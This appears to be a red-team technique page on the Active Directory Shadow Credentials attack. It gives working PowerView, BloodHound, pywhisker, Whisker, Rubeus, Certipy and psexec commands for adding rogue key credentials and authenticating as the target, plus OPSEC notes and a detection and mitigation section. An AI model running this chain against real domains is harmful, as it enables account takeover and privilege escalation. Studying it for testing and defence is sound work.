---
tags:
  - "#type/technique"
  - "#tactic/TA0006"
  - "#technique/T1558001"
  - "#stage/credential-access"
  - "#stage/privilege-escalation"
  - "#os/windows"
  - "#tool/pywhisker"
  - "#tool/whisker"
  - "#tool/certipy"
  - "#tool/rubeus"
aliases:
  - Shadow Credentials
  - PKINIT
  - Kerberos Certificate-based Authentication
  - msDS-KeyCredentialLink Abuse
---

## Technique
___
The Shadow Credentials attack abuses Active Directory's Key Trust feature (introduced in Windows Server 2016) to enable authentication using X.509 certificates via PKINIT (Public Key Cryptography for Initial Authentication in Kerberos). An attacker with write permissions to a target object can modify the `msDS-KeyCredentialLink` attribute, adding a rogue key pair that enables authentication as that account.

Unlike traditional NTLM or Kerberos password-based authentication, this technique enables an attacker to authenticate as the target without ever needing to know or crack the account's password. The attacker creates a certificate, binds it to the target via the `msDS-KeyCredentialLink` attribute, and then uses the certificate to request a TGT (Ticket Granting Ticket) through PKINIT, effectively impersonating the target account.


## Prerequisites
___

**Access Level:** 
- Write permissions to the target object's `msDS-KeyCredentialLink` attribute
- Common scenarios include:
  - GenericAll
  - GenericWrite
  - WriteDacl
  - WriteProperty
  - WriteOwner
  - AllExtendedRights

**System State:**
- Target domain must be at least Windows Server 2016 domain functional level
- Domain controllers must support PKINIT
- Target account must not be a member of the "Protected Users" group

**Information:** 
- Valid domain credentials with the required write permissions to the target

## Considerations
___

**Impact**

A successful Shadow Credentials attack gives the attacker the ability to authenticate as the target account without changing the password, providing persistent access that can be difficult to detect. This technique is particularly useful for lateral movement and privilege escalation, especially when targeting administrative accounts.

**OPSEC**

- **Persistence:** The added key material remains in the attribute until removed, providing persistent access even if the target's password changes.

- **Low Noise:** Unlike password spraying or brute force attempts, this attack doesn't generate authentication failure events.

- **Modification Logs:** Writing to the `msDS-KeyCredentialLink` attribute generates Event ID 4662 (Operation performed on an object) with the target object and attribute specified.

- **Certificate-Based Authentication:** The use of PKINIT generates Event ID 4768 (Kerberos authentication ticket (TGT) was requested) with certificate authentication indicated.


## Execution
___
### Identifying Vulnerable Targets

#### **PowerView**

Identify objects you have write access to:

```powershell
Import-Module .\PowerView.ps1
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "YourAccount"} | Select-Object ObjectDN, ActiveDirectoryRights
```

#### **BloodHound**

Find objects with the required permissions:

```
MATCH p=(u:User {name:'DOMAIN\\YourAccount'})-[r]->(n) 
WHERE r.isacl=true AND (r.rights CONTAINS 'GenericAll' OR r.rights CONTAINS 'GenericWrite' OR r.rights CONTAINS 'WriteProperty') 
RETURN p
```

### Adding Shadow Credentials

#### **Whisker (PowerShell)**

Add a shadow credential to a target user:

```powershell
Import-Module .\Whisker.ps1
New-ShadowCredential -Domain "domain.local" -Target "TargetUser" -Credential (Get-Credential) -ErrorAction Stop
```

Export private key and certificate:

```powershell
New-ShadowCredential -Domain "domain.local" -Target "TargetUser" -Credential (Get-Credential) -Export C:\Temp\ShadowCred.pfx -Password (ConvertTo-SecureString -AsPlainText -Force 'Password123!')
```

#### **Pywhisker (Python)**

Add a shadow credential to a target user:

```bash
python3 pywhisker.py -d "domain.local" -u "YourAccount" -p "YourPassword" --target "TargetUser" --action add
```

Add shadow credential and save certificate:

```bash
python3 pywhisker.py -d "domain.local" -u "YourAccount" -p "YourPassword" --target "TargetUser" --action add --filename shadow.pfx --pfx-password "Password123!"
```

### Authenticating with Shadow Credentials

#### **Rubeus**

Request TGT using the certificate:

```powershell
.\Rubeus.exe asktgt /user:"TargetUser" /domain:"domain.local" /certificate:"MIIJuAIBAzCCCXQGCSq..." /password:"Password123!" /nowrap
```

Or using the certificate file:

```powershell
.\Rubeus.exe asktgt /user:"TargetUser" /domain:"domain.local" /certfile:"C:\Temp\ShadowCred.pfx" /certpass:"Password123!" /nowrap
```

#### **Certipy**

Request TGT using the shadow credentials:

```bash
certipy auth -pfx shadow.pfx -dc-ip 192.168.1.10 -username TargetUser -domain domain.local
```

Use Kerberos authentication for subsequent actions:

```bash
export KRB5CCNAME=TargetUser.ccache
impacket-psexec domain.local/TargetUser@target-server -k -no-pass
```

### Cleaning Up

#### **Whisker**

Remove the shadow credential:

```powershell
New-ShadowCredential -Domain "domain.local" -Target "TargetUser" -Credential (Get-Credential) -Clear -KeyID "4c0c9f99-b4f3-4f45-9421-ac436a47d9e0"
```

#### **Pywhisker**

Remove the shadow credential:

```bash
python3 pywhisker.py -d "domain.local" -u "YourAccount" -p "YourPassword" --target "TargetUser" --action remove --key-id "4c0c9f99-b4f3-4f45-9421-ac436a47d9e0"
```


## Detection & Mitigation
___

#### Detection

- Event ID 4662: Operations performed on Active Directory objects. Look for modifications to the `msDS-KeyCredentialLink` attribute.

- Event ID 4768: Kerberos TGT request with certificate-based authentication.

- Monitor for unexpected changes to the `msDS-KeyCredentialLink` attribute, especially for privileged accounts.

- Regular audits of Key Credentials associated with sensitive accounts.

#### Mitigation

- **Protected Users Group:** Add sensitive accounts to the "Protected Users" security group, which prevents the use of PKINIT.

- **Restricted Admin Permission:** Implement least privilege principles for account permissions in Active Directory.

- **Privileged Access Management:** Implement time-bound, just-in-time access to sensitive accounts.

- **Enhanced Monitoring:** Deploy solutions that monitor for changes to sensitive attributes like `msDS-KeyCredentialLink`.

- **Hardened Security Descriptors:** Modify security descriptors on sensitive objects to prevent unauthorized write access.
